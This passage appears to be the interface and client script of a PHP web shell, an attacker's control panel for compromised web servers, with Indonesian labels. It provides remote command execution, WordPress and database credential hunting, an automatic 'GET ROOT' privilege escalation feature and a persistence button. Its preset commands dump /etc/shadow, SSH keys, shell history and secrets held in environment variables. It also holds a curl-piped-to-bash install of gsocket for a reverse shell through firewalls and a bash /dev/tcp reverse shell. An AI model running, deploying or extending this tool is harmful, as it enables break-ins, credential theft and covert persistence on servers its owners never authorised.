            <input type="hidden" name="delete_target" id="deleteTarget">
            <div class="modal-footer">
                <button type="submit">Delete</button>
                <button type="button" onclick="closeModal('confirmDeleteModal')">Cancel</button>
            </div>
        </form>
    </div>
</div>
<!-- Chmod Bulk Modal -->
<div class="modal" id="chmodBulkModal">
    <div class="modal-content" style="max-width: 800px; width: 90vw; max-height: 90vh; display: flex; flex-direction: column;">
        <div class="modal-header" style="flex-shrink: 0;">
            <h3>🔧 Chmod Bulk</h3>
            <button onclick="closeModal('chmodBulkModal')" style="padding: 4px 12px;">✕</button>
        </div>
        <div style="padding: 15px; overflow-y: auto; flex: 1;">
            <div style="display: flex; gap: 15px; margin-bottom: 15px; flex-wrap: wrap;">
                <div style="flex: 1; min-width: 200px;">
                    <label style="font-size: 12px; color: #888; display: block; margin-bottom: 5px;">
                        Selected: <span id="chmodBulkCount" style="color: #0f0; font-weight: bold;">0</span> items
                    </label>
                    <select id="chmodBulkPerm" style="width: 100%; padding: 8px; background: #222; color: #0f0; border: 1px solid #0f0; border-radius: 4px;">
                        <option value="755">755 (rwxr-xr-x) - Executable</option>
                        <option value="644" selected>644 (rw-r--r--) - Standard File</option>
                        <option value="777">777 (rwxrwxrwx) - Full Access</option>
                        <option value="600">600 (rw-------) - Private</option>
                        <option value="750">750 (rwxr-x---) - Restricted</option>
                        <option value="custom">Custom...</option>
                    </select>
                </div>
                <div id="chmodBulkCustomDiv" style="flex: 1; min-width: 200px; display: none;">
                    <label style="font-size: 12px; color: #888; display: block; margin-bottom: 5px;">Custom:</label>
                    <input type="text" id="chmodBulkCustomInput" placeholder="e.g., 755, u+rwx" style="width: 100%; padding: 8px; background: #222; color: #0f0; border: 1px solid #0f0; border-radius: 4px;">
                </div>
                <div style="flex: 1; min-width: 200px; display: flex; align-items: flex-end;">
                    <label style="font-size: 12px; color: #888; display: flex; align-items: center; cursor: pointer; padding: 8px; background: #1a1a1a; border-radius: 4px; border: 1px solid #333;">
                        <input type="checkbox" id="chmodBulkRecursive" style="margin-right: 8px;">
                        <span>🔁 Recursive (subfolders)</span>
                    </label>
                </div>
            </div>
            
            <div id="chmodBulkProgress" style="display: none; margin-bottom: 15px; padding: 10px; background: #111; border: 1px solid #333; border-radius: 4px;">
                <div style="font-size: 11px; color: #888; margin-bottom: 5px;">
                    Progress: <span id="chmodBulkCurrent" style="color: #0f0; font-weight: bold;">0</span> / <span id="chmodBulkTotal">0</span>
                </div>
                <div style="height: 6px; background: #333; border-radius: 3px; overflow: hidden;">
                    <div id="chmodBulkProgressBar" style="height: 100%; background: linear-gradient(90deg, #0f0, #6cf); width: 0%; transition: width 0.3s;"></div>
                </div>
                <div id="chmodBulkStatus" style="font-size: 11px; color: #6cf; margin-top: 5px;">Initializing...</div>
            </div>
            
            <div id="chmodBulkResults" style="display: none; max-height: 50vh; overflow-y: auto; font-size: 12px; font-family: monospace; background: #000; padding: 10px; border: 1px solid #333; border-radius: 4px;"></div>
        </div>
        <div class="modal-footer" style="flex-shrink: 0; border-top: 1px solid #333; padding: 10px 15px;">
            <button id="chmodBulkExecuteBtn" onclick="executeChmodBulk()" style="background: #ff9800; color: #111; font-weight: bold; padding: 8px 20px;">🚀 Execute</button>
            <button type="button" onclick="closeModal('chmodBulkModal')" id="chmodBulkCloseBtn" style="padding: 8px 20px;">Cancel</button>
        </div>
    </div>
</div>
<div class="modal" id="serverInfoModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3>🖥️ Server Information</h3>
            <button onclick="copyToClipboard('serverInfoContent')">📋 Copy</button>
        </div>
        <div class="modal-body">
            <div id="serverInfoContent">Server information will be loaded here...</div>
        </div>
        <div class="modal-footer">
            <button onclick="closeModal('serverInfoModal')">Close</button>
        </div>
    </div>
</div>
<div class="modal" id="shellModal">
    <div class="modal-content modal-wide">
        <div class="modal-header">
            <h3>💻 Shell Command</h3>
        </div>
        <div class="shell-container">
            <div class="shell-left">
                <form id="shellForm">
                    <input type="text" name="cmd" id="shellCmdInput" placeholder="Type shell command...">
                    <button type="submit">⚡ Execute</button>
                </form>
                <div class="shell-shortcuts">
                    <strong>🎯 Enumeration & Privilege Escalation</strong>
                    <div class="shortcut-list">
                        <div class="shortcut-item" onclick="setShellCommand('whoami && id && groups')">
                            <code>whoami && id</code>
                            <span class="shortcut-desc"><strong>[IDENTITY]</strong> Menampilkan user saat ini, UID, GID, dan grup. Dapat menemukan: grup spesial (sudo, docker, adm), multiple identities, privilege level.</span>
                        </div>
                        <div class="shortcut-item" onclick="setShellCommand('uname -a && cat /proc/version')">
                            <code>uname -a</code>
                            <span class="shortcut-desc"><strong>[KERNEL INFO]</strong> Kernel version, architecture, hostname. Gunanya: Cari kernel exploit spesifik (CVE), determine OS type untuk payload yang tepat.</span>
                        </div>
                        <div class='shortcut-item' onclick='setShellCommand("cat /etc/passwd | grep -E \"/bin/bash|/bin/sh\"")'>
                            <code>cat /etc/passwd</code>
                            <span class='shortcut-desc'><strong>[USER LIST]</strong> Semua user dengan shell aktif. Dapat: username target, home directories, service accounts, potensi lateral movement targets.</span>
                        </div>
                        <div class='shortcut-item' onclick='setShellCommand("cat /etc/shadow 2>/dev/null || echo \"Access Denied - Try privilege escalation first\"")'>
                            <code>cat /etc/shadow</code>
                            <span class='shortcut-desc'><strong>[PASSWORD HASH]</strong> File hash password (requires root). Jika berhasil: Crack password dengan john/hashcat, lateral movement, persistence.</span>
                        </div>
                        <div class="shortcut-item" onclick="setShellCommand('sudo -l 2>/dev/null')">
                            <code>sudo -l</code>
                            <span class="shortcut-desc"><strong>[SUDO RIGHTS]</strong> Command apa saja yang bisa dijalankan sebagai root tanpa password. HIGH VALUE: sudo su, sudo /bin/bash, sudo vim = INSTANT ROOT!</span>
                        </div>
                        <div class='shortcut-item' onclick='setShellCommand("netstat -tulnp 2>/dev/null || ss -tulnp")'>
                            <code>netstat -tulnp</code>
                            <span class='shortcut-desc'><strong>[NETWORK SERVICES]</strong> Port listening, established connections, PID/process. Gunanya: Hidden services (localhost only), database ports, pivot opportunities, port forwarding targets.</span>
                        </div>
                        <div class="shortcut-item" onclick="setShellCommand('ip a && ip r && cat /etc/resolv.conf')">
                            <code>ip a && ip r</code>
                            <span class="shortcut-desc"><strong>[NETWORK CONFIG]</strong> IP addresses, interfaces, routing, DNS. Dapat: Network segments untuk pivoting, dual-homed systems, internal DNS untuk AD enumeration.</span>
                        </div>
                        <div class='shortcut-item' onclick='setShellCommand("ps aux -sort=-%cpu | head -20")'>
                            <code>ps aux</code>
                            <span class='shortcut-desc'><strong>[RUNNING PROCESSES]</strong> Semua process dengan user & command line. Dapat: Credentials di command line (DB password, API keys), cron processes, custom applications.</span>
                        </div>
                        <div class='shortcut-item' onclick='setShellCommand("find / -perm -4000 -type f 2>/dev/null | xargs ls -la 2>/dev/null")'>
                            <code>find SUID</code>
                            <span class='shortcut-desc'><strong>[PRIVESC: SUID]</strong> File dengan SUID bit (jalan sebagai owner). EXPLOIT: nmap, vim, less, man, more, find, bash, nano = ROOT SHELL via GTFOBins!</span>
                        </div>
                        <div class='shortcut-item' onclick='setShellCommand("getcap -r / 2>/dev/null | grep -v \"^/proc\"")'>
                            <code>getcap -r /</code>
                            <span class='shortcut-desc'><strong>[PRIVESC: CAPABILITIES]</strong> Linux capabilities (alternatif SUID). EXPLOIT: cap_setuid+ep pada python, perl, php = UID 0 manipulation!</span>
                        </div>
                        <div class='shortcut-item' onclick='setShellCommand("find /etc/cron* -type f -perm -o+r 2>/dev/null | xargs cat 2>/dev/null")'>
                            <code>cat /etc/cron*</code>
                            <span class='shortcut-desc'><strong>[PERSISTENCE/PRIVESC]</strong> System-wide cron jobs. Dapat: Writable scripts yang dijalankan root, PATH manipulation opportunities, scheduled tasks untuk injection.</span>
                        </div>
                        <div class='shortcut-item' onclick='setShellCommand("find / -writable -type f -not -path \"/proc/*\" -not -path \"/sys/*\" 2>/dev/null | head -30")'>
                            <code>find writable</code>
                            <span class='shortcut-desc'><strong>[WRITABLE FILES]</strong> File yang bisa dimodifikasi current user. Gunanya: Backdoor binaries, modify scripts, DLL hijacking opportunities.</span>
                        </div>
                        <div class="shortcut-item" onclick="setShellCommand('ls -la /root/ 2>/dev/null; ls -la /home/*/.ssh/ 2>/dev/null')">
                            <code>ls /root & .ssh</code>
                            <span class="shortcut-desc"><strong>[ACCESS CHECK]</strong> Cek akses ke /root dan SSH keys. Jika akses: Golden ticket (id_rsa), persistence via authorized_keys, lateral movement.</span>
                        </div>
                        <div class='shortcut-item' onclick='setShellCommand("cat ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.viminfo 2>/dev/null | head -50")'>
                            <code>bash_history</code>
                            <span class='shortcut-desc'><strong>[CREDENTIAL HARVEST]</strong> Command history. Dapat: Password di plain text (mysql -p), sudo usage patterns, internal IP addresses, file locations sensitif.</span>
                        </div>
                        <div class='shortcut-item' onclick='setShellCommand("env | grep -i \"pass\|key\|token\|secret\|cred\"")'>
                            <code>env | grep pass</code>
                            <span class='shortcut-desc'><strong>[ENV VARIABLES]</strong> Environment variables. Sering ada: 🗄️ Database</span>
                        </div>
                        <div class='shortcut-item' onclick='setShellCommand("find /home -name \".env\" -o -name \"config.php\" -o -name \"wp-config.php\" -o -name \"settings.py\" 2>/dev/null | head -10")'>
                            <code>find config files</code>
                            <span class='shortcut-desc'><strong>[CONFIG HUNTING]</strong> Cari file konfigurasi aplikasi. Isinya: DB credentials, API secrets, encryption keys, cloud service configs.</span>
                        </div>
                        <div class="shortcut-item" onclick="setShellCommand('cat /etc/os-release && lsb_release -a 2>/dev/null')">
                            <code>os-release</code>
                            <span class="shortcut-desc"><strong>[OS VERSION]</strong> Detail distro & version. Gunanya: Cari exploit spesifik OS, determine package manager (apt/yum), compatibility checks.</span>
                        </div>
                        <div class="shortcut-item" onclick="setShellCommand('which python python3 perl ruby nc nc.traditional ncat python2 2>/dev/null')">
                            <code>which interpreters</code>
                            <span class="shortcut-desc"><strong>[AVAILABLE TOOLS]</strong> Cek binary untuk reverse shell/payload. Python = pty upgrade, nc = netcat listener, perl/ruby = alternative payload.</span>
                        </div>
                        <div class="shortcut-item" onclick="setShellCommand('ls -la /var/www/html /opt /srv /var/lib 2>/dev/null')">
                            <code>ls web dirs</code>
                            <span class="shortcut-desc"><strong>[WEB ENUM]</strong> Cek direktori web server. Dapat: Source code aplikasi, upload directories, database configs, log files.</span>
                        </div>
                        <div class="shortcut-divider"></div>
                        <div class="shortcut-item" onclick='setShellCommand("bash -c \"$(curl -fsSL https://gsocket.io/y)\"")'>
                            <code>Install Gsocket</code>
                            <span class="shortcut-desc"><strong>[PERSISTENCE TOOL]</strong> Install gsocket - Global Socket untuk reverse shell yang melewati firewall/NAT tanpa port forwarding.</span>
                        </div>
                        <div class="shortcut-item" onclick='setShellCommand("GS_UNDO=1 bash -c \"$(curl -fsSL https://gsocket.io/y)\"")'>
                            <code>Undo Gsocket</code>
                            <span class="shortcut-desc"><strong>[CLEANUP]</strong> Menghapus gsocket dari sistem - Bersihkan jejak setelah testing selesai.</span>
                        </div>
                        <div class="shortcut-divider"></div>
                        <div class='shortcut-item' onclick='setShellCommand("bash -i >& /dev/tcp/__IP__/443 0>&1")'>
                            <code>Reverse Shell Bash</code>
                            <span class='shortcut-desc'><strong>[REVERSE SHELL]</strong> Classic bash reverse shell. Ganti __IP__ dengan IP attacker Anda. Jalankan netcat listener: nc -lvnp 443</span>
                        </div>
                    </div>
                </div>
            </div>
            <div class="shell-right">
                <div class="shell-output-header">
                    <strong>💻 Output:</strong>
                    <button onclick="copyToClipboard('shellOutput')" style="padding: 4px 10px; font-size: 11px;"> Copy</button>
                </div>
                <pre id="shellOutput">Output will appear here...</pre>
            </div>
        </div>
        <div class="modal-footer">
            <button onclick="closeModal('shellModal')">Close</button>
        </div>
    </div>
</div>
<div class="modal" id="searchResultsModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3>Search Results</h3>
            <button onclick="copyToClipboard('searchResultsContent')">Copy</button>
        </div>
        <div class="modal-body">
            <div id="searchResultsContent">Results will appear here...</div>
        </div>
        <div class="modal-footer">
            <button onclick="closeModal('searchResultsModal')">Close</button>
        </div>
    </div>
</div>
<div class="modal" id="websiteDiscoverModal">
    <div class="modal-content modal-discover">
        <div class="modal-header">
            <h3 title="Discover all websites on this server">🌐 Website Discovery</h3>
        </div>
        <div class="discover-container">
            <div class="discover-sidebar">
                <h4 style="margin:0 0 15px 0;color:#6cf;font-size:13px;">⚡ Konfigurasi Scan</h4>
                <div style="margin-bottom:15px;">
                    <label style="font-size:11px;color:#888;display:block;margin-bottom:8px;">🔍 Mode Pencarian:</label>
                    <div class="search-type-selector">
                        <div class="search-type active" data-type="filename" onclick="selectSearchType('filename')">
                            📄 Nama File
                        </div>
                        <div class="search-type" data-type="content" onclick="selectSearchType('content')">
                            📝 Konten File
                        </div>
                    </div>
                </div>
                <div style="margin-bottom:15px;">
                    <label style="font-size:11px;color:#888;display:block;margin-bottom:5px;">
                        📋 Pattern (pisah dengan koma):
                    </label>
                    <textarea id="searchPattern" rows="3" placeholder="index.php, index.html, .htaccess" style="font-size:11px;width:100%;resize:vertical;">index.php, index.html, .htaccess</textarea>
                    <p id="patternHint" style="font-size:10px;color:#666;margin:5px 0 0 0;">
                        Contoh: *.php, config.*, wp-config.php
                    </p>
                </div>
                <div style="margin-bottom:15px;">
                    <label style="font-size:11px;color:#888;display:block;margin-bottom:8px;">📊 Kedalaman Scan:</label>
                    <div class="scan-modes">
                        <div class="scan-mode" data-mode="quick" onclick="selectScanMode('quick')">
                            <strong>⚡ Quick</strong>
                            <span class="scan-desc">1-2 level, ~30 detik</span>
                        </div>
                        <div class="scan-mode active" data-mode="standard" onclick="selectScanMode('standard')">
                            <strong>📊 Standard</strong>
                            <span class="scan-desc">3-4 level, ~2 menit</span>
                        </div>
                        <div class="scan-mode" data-mode="deep" onclick="selectScanMode('deep')">
                            <strong>🎯 Deep</strong>
                            <span class="scan-desc">5-6 level, ~5 menit</span>
                        </div>
                        <div class="scan-mode" data-mode="brutal" onclick="selectScanMode('brutal')">
                            <strong> ' Brutal</strong>
                            <span class="scan-desc">8+ level, >10 menit</span>
                        </div>
                    </div>
                </div>
                <div style="margin-bottom:15px;padding:10px;background:#222;border-radius:4px;">
                    <label style="font-size:11px;color:#888;display:flex;align-items:center;cursor:pointer;">
                        <input type="checkbox" id="extractTitle" checked style="margin-right:8px;">
                        📝 Extract &lt;title&gt; dari index
                    </label>
                    <label style="font-size:11px;color:#888;display:flex;align-items:center;cursor:pointer;margin-top:8px;">
                        <input type="checkbox" id="showPreview" style="margin-right:8px;">
                        👁️ Tampilkan preview konten (mode konten)
                    </label>
                </div>
                <button id="startScanBtn" onclick="startWebsiteScan()" style="width:100%;padding:12px;background:#0f0;color:#111;font-weight:bold;font-size:14px;">
                    🚀 Mulai Scan
                </button>
                <div id="scanStats" style="margin-top:15px;padding:10px;background:#1a1a1a;border-radius:4px;font-size:11px;color:#888;display:none;">
                    <div>⏰ Waktu: <span id="scanTime">0s</span></div>
                    <div>🔍 Ditemukan: <span id="scanCount">0</span></div>
                    <div>📊 Status: <span id="scanStatus">Menunggu...</span></div>
                </div>
            </div>
            <div class="discover-main">
                <div id="websiteDiscoverContent" class="discover-content">
                    <div class="discover-placeholder">
                        <span style="font-size:50px;">'</span>
                        <h3 style="color:#6cf;margin:15px 0;">🌐 Website Discovery</h3>
                        <p style="color:#888;">Konfigurasi pencarian di panel kiri, lalu klik "Mulai Scan"</p>
                        <div style="margin-top:20px;text-align:left;padding:15px;background:#1a1a1a;border-radius:6px;font-size:11px;">
                            <p style="color:#6cf;margin-bottom:10px;"><strong> Tips Penggunaan:</strong></p>
                            <p style="color:#888;margin:5px 0;"><strong>📄 Mode Nama File:</strong></p>
                            <p style="color:#666;margin:3px 0;padding-left:10px;">• index.php, index.html, .htaccess</p>
                            <p style="color:#666;margin:3px 0;padding-left:10px;">• wp-config.php, configuration.php</p>
                            <p style="color:#666;margin:3px 0;padding-left:10px;">• *.php, config.* (wildcard)</p>
                            <p style="color:#888;margin:10px 0 5px 0;"><strong>🎉 Mode Konten:</strong></p>
                            <p style="color:#666;margin:3px 0;padding-left:10px;">• DB_PASSWORD, username, password</p>
                            <p style="color:#666;margin:3px 0;padding-left:10px;">• API_KEY, SECRET_KEY, token</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="modal-footer">
            <button onclick="closeModal('websiteDiscoverModal')">Close</button>
        </div>
    </div>
</div>
<div class="modal" id="dbExploreModal">
    <div class="modal-content" style="max-width: 900px;">
        <div class="modal-header">
            <h3 title="Auto-detected WordPress database configurations">- 🅿️ WordPress 🗄️ Database</h3>
        </div>
        <div class="modal-body">
            <div id="dbExploreContent">
                <p>Searching for wp-config.php files...</p>
            </div>
        </div>
        <div class="modal-footer">
            <button onclick="closeModal('dbExploreModal')">Close</button>
        </div>
    </div>
</div>
<div class="modal" id="dbConnectModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3 title="Manual database connection">🗄️ Database</h3>
        </div>
        <div class="modal-body">
            <form id="dbConnectForm">
                <label style="font-size:12px;color:#888;">Hostname:</label>
                <input type="text" name="db_host" id="dbHost" placeholder="localhost" value="localhost">
                <label style="font-size:12px;color:#888;">Port:</label>
                <input type="number" name="db_port" id="dbPort" placeholder="3306" value="3306">
                <label style="font-size:12px;color:#888;">🗄️ Database</label>
                <input type="text" name="db_name" id="dbName" placeholder="database_name">
                <label style="font-size:12px;color:#888;">Username:</label>
                <input type="text" name="db_user" id="dbUser" placeholder="root">
                <label style="font-size:12px;color:#888;">Password:</label>
                <input type="text" name="db_pass" id="dbPass" placeholder="password">
            </form>
            <div id="dbConnectStatus" style="margin-top:10px;padding:10px;background:#1a1a1a;border-radius:4px;display:none;"></div>
        </div>
        <div class="modal-footer">
            <button onclick="testDbConnection()">Test Connection</button>
            <button onclick="connectToDatabase()">Connect & Manage</button>
            <button onclick="closeModal('dbConnectModal')">Close</button>
        </div>
    </div>
</div>
<div class="modal" id="dbManagerModal">
    <div class="modal-content modal-fullscreen">
        <div class="modal-header">
            <h3 title="🗄️ Database Manager">🗄️ Database Manager</h3>
            <div id="dbConnectionInfo" style="font-size:11px;color:#888;"></div>
        </div>
        <div class="modal-body db-manager-body">
            <div class="db-sidebar">
                <h4 style="margin:0 0 10px 0;font-size:13px;color:#6cf;">📋 Tables</h4>
                <div id="dbTablesList"><p>⏳ Loading tables...</p>
                </div>
            </div>
            <div class="db-main-content">
                <div class="db-query-section">
                    <label style="font-size:12px;color:#888;display:block;margin-bottom:5px;">📄 SQL Query:</label>
                    <div class="db-query-input">
                        <textarea id="sqlQuery" placeholder="SELECT * FROM table_name LIMIT 10;" style="font-family: monospace; font-size: 13px;"></textarea>
                        <div class="db-query-buttons">
                            <button onclick="executeSqlQuery()" style="background:#0f0;color:#111;font-weight:bold;">⚡ Execute</button>
                            <button onclick="clearSqlResult()">🗑️ Clear</button>
                        </div>
                    </div>
                </div>
                <div class="db-result-section">
                    <div id="sqlResult">
                        <p style="color: #666;">Execute a query to see results...</p>
                    </div>
                </div>
            </div>
        </div>
        <div class="modal-footer">
            <button onclick="closeModal('dbManagerModal')">Close</button>
        </div>
    </div>
</div>

<!-- 🔥 Privilege Escalation Modal -->
<div class="modal" id="privescModal">
    <div class="modal-content" style="max-width: 900px; width: 90vw; max-height: 85vh;">
        <div class="modal-header" style="padding: 10px 15px;">
            <h3 style="margin:0;">💀 Privilege Escalation</h3>
            <button onclick="closeModal('privescModal')" style="padding: 4px 12px;">✕</button>
        </div>
        <div style="padding: 10px 15px;">
            <!-- Action Buttons Row -->
            <div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap;">
                <button id="getRootBtn" onclick="autoGetRoot()" style="flex:2;min-width:150px;background:linear-gradient(135deg,#f44,#f80);color:#fff;font-weight:bold;padding:10px;font-size:14px;border:none;border-radius:4px;cursor:pointer;">🔥 GET ROOT (AUTO)</button>
                <button onclick="scanPrivesc()" style="flex:1;min-width:80px;background:#0f0;color:#111;font-weight:bold;padding:8px;font-size:12px;border:none;border-radius:4px;cursor:pointer;">🔍 Scan</button>
                <button onclick="installPersistence()" style="flex:1;min-width:80px;background:#f80;color:#111;font-weight:bold;padding:8px;font-size:12px;border:none;border-radius:4px;cursor:pointer;">🔒 Persist</button>
                <button onclick="scanOtherShells()" style="flex:1;min-width:100px;background:#f44;color:#fff;font-weight:bold;padding:8px;font-size:12px;border:none;border-radius:4px;cursor:pointer;">🕵️ Shells</button>
            </div>
            
            <!-- Status Bar -->
            <div id="privescStatus" style="display:none;margin-bottom:10px;padding:8px;background:#1a1a1a;border:1px solid #333;border-radius:4px;font-size:12px;"></div>
            
            <!-- Stats Row -->
            <div style="display:flex;gap:15px;margin-bottom:10px;padding:8px;background:#111;border-radius:4px;font-size:11px;color:#888;">
                <span>🐛 <span id="statKernel">-</span></span>
                <span>⚡ SUID: <span id="statSuid">0</span></span>
                <span>🔑 Sudo: <span id="statSudo">No</span></span>
                <span>🐳 Docker: <span id="statDocker">No</span></span>
            </div>
            
            <!-- Results Area -->
            <div id="privescResults" style="display:none;max-height:150px;overflow-y:auto;background:#0a0a0a;border:1px solid #0f0;border-radius:4px;padding:8px;margin-bottom:8px;font-size:11px;">
            </div>
            
            <!-- Output Log (Main display area) -->
            <div id="privescOutput" style="height:200px;overflow-y:auto;background:#000;border:1px solid #333;border-radius:4px;padding:8px;font-family:monospace;font-size:11px;white-space:pre-wrap;">
                <div style="text-align:center;padding:20px;color:#666;">
                    <span style="font-size:20px;">💀</span>
                    <p style="margin:5px 0;font-size:11px;">Click 🔥 GET ROOT (AUTO) to start</p>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
document.addEventListener('keydown', function(e) { if (e.key === 'Escape') { document.querySelectorAll('.modal').forEach(modal => modal.classList.remove('active')); } });
function openModal(id) { document.getElementById(id).classList.add('active'); }
function closeModal(id) { document.getElementById(id).classList.remove('active'); }
function copyToClipboard(elementId) {
    const element = document.getElementById(elementId);
    const textToCopy = element.value || element.innerText;
    navigator.clipboard.writeText(textToCopy).then(() => {
        alert('✅ Berhasil dicopy ke clipboard!');
    }).catch(err => {
        // Fallback for older browsers
        element.select();
        document.execCommand('copy');
        alert('✅ Berhasil dicopy ke clipboard!');
    });
}

// Check if root - removed as redundant with autoGetRoot

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}
function setShellCommand(cmd) {
    document.getElementById('shellCmdInput').value = cmd;
}
function loadAndShowServerInfo() {
    const modal = document.getElementById('serverInfoModal');
    const contentDiv = document.getElementById('serverInfoContent');
    openModal('serverInfoModal');
    contentDiv.innerHTML = '⏳ Loading server information, please wait...';
    const url = '?masuk=<?php echo AL_SHELL_KEY ?>&action=get_server_info';
    fetch(url)
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.text();
        })
        .then(html => {
            contentDiv.innerHTML = html;
        })
        .catch(error => {
            contentDiv.innerHTML = 'Failed to load server information: ' + error.message;
        });
}
function viewFileAsync(fileName) {
    const modal = document.getElementById('viewModal');
    const title = document.getElementById('viewTitle');
    const content = document.getElementById('viewContent');
    title.textContent = 'View: ' + fileName;
    content.textContent = '⏳ Loading...';
    openModal('viewModal');
    fetch('?masuk=<?php echo AL_SHELL_KEY ?>&d=<?php echo urlencode($dir) ?>&action=view_file&file=' + encodeURIComponent(fileName))
        .then(response => response.json())
        .then(data => { content.textContent = data.content; })
        .catch(error => { content.textContent = 'Error loading file: ' + error; });
}
function openEditModal(fileName) {
    const modal = document.getElementById('editModal');
    document.getElementById('editTitle').textContent = 'Edit: ' + fileName;
    document.getElementById('editFile').value = fileName;
    document.getElementById('editContent').value = '⏳ Loading...';
    openModal('editModal');
    fetch('?masuk=<?php echo AL_SHELL_KEY ?>&d=<?php echo urlencode($dir) ?>&action=view_file&file=' + encodeURIComponent(fileName))
        .then(response => response.json())
        .then(data => { document.getElementById('editContent').value = data.content; });
}
function openRenameModal(fileName) {
    document.getElementById('renameTitle').textContent = 'Rename: ' + fileName;
    document.getElementById('renameTarget').value = fileName;
    document.querySelector('#renameModal input[name="new_name"]').value = fileName;
    openModal('renameModal');
}
function openChmodModal(fileName) {
    document.getElementById('chmodTitle').textContent = 'Change Permissions: ' + fileName;
    document.getElementById('chmodTarget').value = fileName;
    document.getElementById('customPermInput').value = '';
    document.getElementById('customPermDiv').style.display = 'none';
    document.getElementById('chmodPermSelect').value = '755';
    openModal('chmodModal');
}
function openDeleteModal(fileName) {
    document.getElementById('deleteMessage').textContent = `Are you sure you want to delete "${fileName}"?`;
    document.getElementById('deleteTarget').value = fileName;
    openModal('confirmDeleteModal');
}
function goToDefaultDirectory() {
    window.location.href = '?masuk=<?php echo AL_SHELL_KEY ?>&d=<?php echo urlencode($default_dir) ?>';
}
document.getElementById('searchForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const modal = document.getElementById('searchResultsModal');
    const contentDiv = document.getElementById('searchResultsContent');
    openModal('searchResultsModal');
    contentDiv.innerHTML = 'Searching, please wait...';
    const formData = new FormData(this);
    formData.append('action', 'perform_search');
    formData.append('masuk', '<?php echo AL_SHELL_KEY ?>');
    formData.append('d', '<?php echo htmlspecialchars($dir) ?>');
    fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=perform_search', {
        method: 'POST',
        body: formData
    })
        .then(response => response.text())
        .then(html => {
            contentDiv.innerHTML = html;
        })
        .catch(error => {
            contentDiv.innerHTML = 'Search failed: ' + error.message;
        });
});
document.getElementById('shellForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const output = document.getElementById('shellOutput');
    output.textContent = '- Executing...';
    const formData = new FormData(this);
    formData.append('masuk', '<?php echo AL_SHELL_KEY ?>');
    formData.append('d', '<?php echo htmlspecialchars($dir) ?>');
    fetch('', { method: 'POST', body: formData })
        .then(response => response.text())
        .then(html => {
            console.log('Shell response received, length:', html.length);
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');
            const newOutput = doc.querySelector('.output');
            if (newOutput) {
                console.log('Output element found:', newOutput.innerText.substring(0, 100));
                output.textContent = newOutput.innerText.trim();
            } else {
                console.log('Output element NOT found in response');
                output.textContent = 'No output returned. (Response: ' + html.substring(0, 200) + '...)';
            }
        })
        .catch(error => {
            console.error('Shell error:', error);
            output.textContent = 'Error executing command: ' + error;
        });
});
document.getElementById('chmodForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const formData = new FormData(this);
    const permSelect = document.getElementById('chmodPermSelect');
    const customInput = document.getElementById('customPermInput');
    if (permSelect.value === 'custom') {
        if (customInput.value.trim() === '') {
            alert('Please enter a custom permission value.');
            return;
        }
        formData.set('chmod_perm', customInput.value);
    }
    fetch('', { method: 'POST', body: formData }).then(() => window.location.reload());
});
document.getElementById('chmodPermSelect').addEventListener('change', function() {
    const customDiv = document.getElementById('customPermDiv');
    if (this.value === 'custom') {
        customDiv.style.display = 'block';
    } else {
        customDiv.style.display = 'none';
    }
});
document.getElementById('navigateForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const formData = new FormData(this);
    formData.append('masuk', '<?php echo AL_SHELL_KEY ?>');
    fetch('', { method: 'POST', body: formData })
        .then(response => {
            if (response.redirected) {
                window.location.href = response.url;
            } else {
                return response.text();
            }
        })
        .then(html => {
            if (html) {
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, 'text/html');
                const newOutput = doc.querySelector('.output');
                if (newOutput && newOutput.innerText.trim()) {
                    alert(newOutput.innerText.trim());
                }
            }
        })
        .catch(error => {
            alert('Error navigating to directory: ' + error);
        });
});
document.addEventListener('click', function(e) {
    if (e.target.classList.contains('action-link')) {
        const row = e.target.closest('tr');
        if (row) {
            const fileName = row.dataset.filename;
            if (e.target.textContent.includes('[V]')) viewFileAsync(fileName);
            if (e.target.textContent.includes('[E]')) openEditModal(fileName);
            if (e.target.textContent.includes('[R]')) openRenameModal(fileName);
            if (e.target.textContent.includes('[Chmod]')) openChmodModal(fileName);
            if (e.target.textContent.includes('[Del]')) openDeleteModal(fileName);
            if (e.target.textContent.includes('[U]')) unzipFile(fileName);
        }
    }
});
const zipBtn = document.getElementById('zipSelectedBtn');
const chmodBulkBtn = document.getElementById('chmodSelectedBtn');
const deleteBtn = document.getElementById('deleteSelectedBtn');
const selectAllCheckbox = document.getElementById('selectAll');
document.addEventListener('change', function(e) {
    if (e.target.classList.contains('file-select')) {
        const anyChecked = document.querySelectorAll('.file-select:checked').length > 0;
        zipBtn.disabled = !anyChecked;
        chmodBulkBtn.disabled = !anyChecked;
        deleteBtn.disabled = !anyChecked;
    }
});
selectAllCheckbox.addEventListener('change', function() {
    const checkboxes = document.querySelectorAll('.file-select');
    checkboxes.forEach(cb => cb.checked = this.checked);
    // Update button state directly
    const anyChecked = this.checked && checkboxes.length > 0;
    zipBtn.disabled = !anyChecked;
    chmodBulkBtn.disabled = !anyChecked;
    deleteBtn.disabled = !anyChecked;
});
zipBtn.addEventListener('click', function() {
    const checkboxes = document.querySelectorAll('.file-select:checked');
    if (checkboxes.length === 0) return;
    const formData = new FormData();
    formData.append('action', 'zip_selected');
    checkboxes.forEach(cb => formData.append('selected_files[]', cb.value));
    fetch('', { method: 'POST', body: formData }).then(() => window.location.reload());
});
deleteBtn.addEventListener('click', function() {
    const checkboxes = document.querySelectorAll('.file-select:checked');
    if (checkboxes.length === 0) return;
    if (confirm(`Are you sure you want to delete ${checkboxes.length} selected item(s)?`)) {
        const formData = new FormData();
